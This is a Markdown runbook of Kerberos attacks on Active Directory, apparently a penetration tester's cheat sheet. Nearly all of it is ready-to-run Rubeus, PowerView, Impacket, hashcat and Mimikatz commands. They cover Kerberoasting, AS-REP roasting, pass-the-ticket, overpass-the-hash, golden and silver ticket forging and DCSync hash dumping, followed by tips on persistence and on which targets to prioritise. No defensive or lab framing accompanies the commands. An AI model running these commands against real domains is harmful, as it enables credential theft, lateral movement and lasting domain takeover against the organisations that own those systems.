# Kerberos Attack Runbook

---

## Kerberoasting (Crack Service Account Hashes)

**Target:** Accounts with SPNs (service accounts). No special privileges needed.

```powershell
# Via Rubeus (on target)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Via PowerView (on target)
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname
Request-SPNTicket -SPN "MSSQLSvc/dc01.corp.com:1433" -Format Hashcat

# Via Impacket (from Kali with creds)
python3 GetUserSPNs.py corp.com/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

**Crack:**
```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

---

## AS-REP Roasting (No Pre-Auth Required)

**Target:** Accounts with "Do not require Kerberos preauthentication" set.

```powershell
# Via Rubeus (on target)
.\Rubeus.exe asreproast /outfile:asrep.txt

# Via Impacket (from Kali — no creds needed if you have a user list)
python3 GetNPUsers.py corp.com/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
```

**Crack:**
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Pass-the-Ticket

```powershell
# Dump existing tickets
.\Rubeus.exe dump /nowrap

# Inject a ticket
.\Rubeus.exe ptt /ticket:<base64_ticket_blob>

# Verify
klist
```

---

## Overpass-the-Hash (Hash → TGT → Lateral Movement)

```powershell
# Create TGT from NTLM hash
.\Rubeus.exe asktgt /user:<USER> /ntlm:<NTHASH> /domain:<DOMAIN> /ptt

# OR via Mimikatz
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH> /run:powershell.exe
```

---

## Golden Ticket (Domain Persistence — Needs KRBTGT Hash)

```
# In Mimikatz after getting KRBTGT hash
kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
```

**Get KRBTGT hash:** `lsadump::dcsync /user:CORP\krbtgt`

---

## Silver Ticket (Service-Specific Forgery)

```
# Forge service ticket without TGT (uses service account hash)
kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN_SID> /target:<SERVICE_HOST> /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /ptt
```

---

## DCSync (Pull Any Hash from DC — No Local Access Needed)

**Requires:** `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (Domain Admin or equivalent)

```
# Mimikatz
lsadump::dcsync /user:CORP\Administrator
lsadump::dcsync /user:CORP\krbtgt    # get golden ticket material

# Impacket (from Kali)
python3 secretsdump.py corp/user:password@<DC_IP>
```

---

## Notes
- **Kerberoast target priority**: SQL service accounts, HTTP, MSSQLSvc — often crackable
- **Ticket lifetime**: TGTs valid 10h, renewable up to 7 days — injected tickets persist
- **Golden ticket**: Even if password changed, golden ticket valid until KRBTGT reset twice
